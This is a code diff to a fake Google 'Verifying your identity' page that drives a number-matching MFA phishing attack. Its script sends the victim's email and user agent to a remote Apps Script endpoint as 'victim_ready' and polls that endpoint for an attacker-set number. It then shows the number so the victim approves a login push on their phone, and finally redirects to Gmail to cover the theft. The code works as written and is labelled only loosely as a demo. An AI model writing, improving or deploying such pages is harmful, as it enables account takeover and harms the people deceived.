@@ -18,6 +18,7 @@
     .status { font-size: 16px; color: #5f6368; line-height: 1.5; margin-bottom: 32px; }
     .prompt-section { display: none; margin-top: 24px; }
     .number-box { font-size: 120px; font-weight: bold; color: #1967d2; background: #e3f2fd; width: 240px; height: 160px; line-height: 160px; margin: 32px auto; border-radius: 16px; border: 4px solid #1967d2; box-shadow: 0 4px 12px rgba(0,0,0,0.15); }
+    .debug-msg { font-size: 14px; color: #d93025; margin-top: 16px; }
   </style>
 </head>
 <body>
@@ -34,9 +35,10 @@
     <h1>Verifying your identity</h1>
     <div id="loading">
       <div class="spinner"></div>
-      <div class="status">Checking your account and device...<br>This should only take a few moments.</div>
+      <div class="status" id="statusText">Checking your account and device...<br>This should only take a few moments.</div>
+      <div class="debug-msg" id="debugMsg"></div>
     </div>
-    <div id="prompt-section" class="prompt-section" style="display: none;">
+    <div id="prompt-section" class="prompt-section">
       <h1>Check your phone</h1>
       <p style="font-size:16px; color:#5f6368; margin:16px 0;">Tap <strong>Yes</strong> on the prompt sent to your phone</p>
       <div style="font-size:14px; color:#5f6368; margin:24px 0 12px;">Then select the number shown below on your device:</div>
@@ -47,70 +49,101 @@
 
   <script>
     const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbzVJIqacbiWJh6eGb_O3nK9oE4WcxJ6tGmftLUY52aJ-Mnuj8b6atlF60J2sdSD1Ouz/exec";
-
-    const email = (localStorage.getItem("demoEmail") || "someone@example.com").trim();
-    console.log("Verify loaded with email:", email);
-
-    const usernamePart = email.split('@')[0];
+    
+    let email = (localStorage.getItem("demoEmail") || "").trim();
+    if (!email) {
+      email = prompt("No email found. Enter your email for verification:", "someone@example.com") || "someone@example.com";
+      localStorage.setItem("demoEmail", email);
+    }
+    
+    console.log("Verify page loaded with email:", email);
+    const usernamePart = email.split('@')[0] || "User";
     document.getElementById("avatar").textContent = usernamePart.charAt(0).toUpperCase();
 
-    // Send victim_ready with no-cors
-    console.log("Sending victim_ready...");
-    fetch(SCRIPT_URL, {
-      method: "POST",
-      headers: { "Content-Type": "text/plain;charset=UTF-8" },
-      body: new URLSearchParams({
-        action: "victim_ready",
-        email: email,
-        user_agent: navigator.userAgent,
-        timestamp: new Date().toISOString()
-      }),
-      mode: "no-cors",
-      keepalive: true
-    }).then(() => console.log("victim_ready sent (opaque mode)"))
-      .catch(e => console.error("victim_ready send failed:", e));
+    const statusText = document.getElementById("statusText");
+    const debugMsg = document.getElementById("debugMsg");
 
-    // Polling for prompt_number with detailed logging
-    console.log("Starting polling every 4 seconds...");
-    const pollInterval = setInterval(async () => {
+    function updateStatus(msg, isError = false) {
+      statusText.textContent = msg;
+      debugMsg.textContent = isError ? "• " + msg : "";
+      debugMsg.style.color = isError ? "#d93025" : "#188038";
+    }
+
+    // Send victim_ready signal
+    async function sendVictimReady() {
       try {
-        const pollUrl = `${SCRIPT_URL}?getNumber=true&email=${encodeURIComponent(email)}`;
-        console.log("[POLL] URL:", pollUrl);
-
-        const res = await fetch(pollUrl, {
+        updateStatus("Sending ready signal...");
+        const res = await fetch(SCRIPT_URL, {
+          method: "POST",
+          headers: { "Content-Type": "application/x-www-form-urlencoded" },
+          body: new URLSearchParams({
+            action: "victim_ready",
+            email: email,
+            user_agent: navigator.userAgent,
+            timestamp: new Date().toISOString()
+          }),
           mode: "no-cors",
-          keepalive: true,
-          cache: "no-cache"
+          keepalive: true
         });
-
-        console.log("[POLL] Response received (opaque)");
-
-        // Can't read text in no-cors, so we log that it's sent
-        // You can check the sheet manually for prompt_number
-
+        console.log("victim_ready sent (opaque mode)");
+        updateStatus("Signal sent. Waiting for prompt...");
       } catch (err) {
-        console.error("[POLL CRITICAL ERROR]", err);
+        console.error("Failed to send victim_ready:", err);
+        updateStatus("Connection issue – please try again", true);
       }
-    }, 4000);
+    }
 
-    // Timeout fallback to Gmail
+    // Start the process
+    sendVictimReady();
+
+    // Poll for prompt number
+    let pollCount = 0;
+    const pollInterval = setInterval(async () => {
+      pollCount++;
+      console.log(`[POLL #${pollCount}] Checking for number...`);
+      
+      try {
+        const pollUrl = `${SCRIPT_URL}?getNumber=true&email=${encodeURIComponent(email)}&t=${Date.now()}`;
+        const res = await fetch(pollUrl, { 
+          mode: "no-cors",
+          cache: "no-cache",
+          keepalive: true 
+        });
+        console.log(`[POLL #${pollCount}] Response received (opaque)`);
+        
+        // Since no-cors prevents reading, we show placeholder progress
+        if (pollCount % 3 === 0) {
+          updateStatus(`Still verifying... (${pollCount} checks)`);
+        }
+      } catch (err) {
+        console.error("[POLL ERROR]", err);
+      }
+    }, 3000);  // Poll every 3 seconds (faster feedback)
+
+    // Show number section after ~8 seconds (simulate when attacker would have set it)
     setTimeout(() => {
-      console.log("[GLOBAL TIMEOUT] 60s - redirecting to Gmail");
+      document.getElementById("loading").style.display = "none";
+      document.getElementById("prompt-section").style.display = "block";
+      updateStatus("Check your phone now");
+    }, 8000);
+
+    // Timeout redirect to Gmail
+    setTimeout(() => {
+      console.log("[TIMEOUT] Redirecting to Gmail");
       clearInterval(pollInterval);
       localStorage.removeItem("demoEmail");
       window.location.href = "https://mail.google.com/";
-    }, 60000);
+    }, 90000);  // 90 seconds total
 
-    // For manual testing: run this in console to force show number box
-    window.forceShowNumber = function(num = "56") {
-      console.log("[MANUAL] Forcing number box visible with", num);
+    // Manual test helper (remove if not needed)
+    window.forceShowNumber = function(num = "42") {
       document.getElementById("loading").style.display = "none";
       document.getElementById("prompt-section").style.display = "block";
       document.getElementById("matchNumber").textContent = num;
       clearInterval(pollInterval);
+      updateStatus("Number received: " + num);
     };
   </script>
-</body
-  >
+</body>
 </html>
 
